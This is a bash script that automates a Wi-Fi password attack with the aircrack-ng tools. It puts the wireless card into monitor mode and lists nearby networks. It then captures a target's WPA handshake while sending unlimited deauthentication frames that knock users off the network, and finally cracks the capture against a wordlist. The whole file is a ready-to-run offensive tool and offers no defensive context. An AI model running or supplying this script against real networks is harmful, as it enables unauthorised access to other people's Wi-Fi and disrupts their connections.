#!/bin/bash

#colors
RED='\033[0;31m'
NC='\033[0m'
Y='\033[1;33m'

clear

#################### Retore Interface ######################
function reset(){
echo -e "${RED}Restoring EveryThing Back to Normal${NC}"
{
airmon-ng stop wlan0mon
systemctl start NetworkManager
rm /opt/Easy-Script/Cap/*
}&> /dev/null
sleep 5
}

################### Start Cracking #######################
function crack(){
clear
read -p "Enter Your Wordlist Location :" wordlist
aircrack-ng /opt/Easy-Script/Cap/$name-01.cap -w $wordlist
reset
}

################### did you got the handshake #################
function check(){
    echo -e "did 2 terminal window open for handshake capture?(y/n)"
    read ans
    if [ "$ans" == "y" ]
    then
        crack
    fi
}

################### Capture Handshake ######################
function start(){
clear
echo -e "${Y}Hit ${NC}${RED}ctrl+c won both screen${NC} ${Y}when you get the handshake${NC}"
xterm -e airodump-ng -w /opt/Easy-Script/Cap/$name -c $ch --bssid $bssid wlan0mon &
xterm -e aireplay-ng wlan0mon --deauth 0 -a $bssid
check
}

################### Start Monitor Mode ########################
{
airmon-ng check kill
airmon-ng start wlan0
}&> /dev/null
echo "Seting Every Thing Up"
sleep 3

#################### Gather Wifi ##########################
echo "after 4 to 6 second Press ctrl+c to see wifi list "
airodump-ng wlan0mon > wifi.lst
cat wifi.lst

#################### Enter Wifi Details ###################
read -p "Enter the bssid of your target :" bssid
read -p "Enter A name for your .cap file :" name
read -p "Enter Channel number of the Wifi :" ch
start


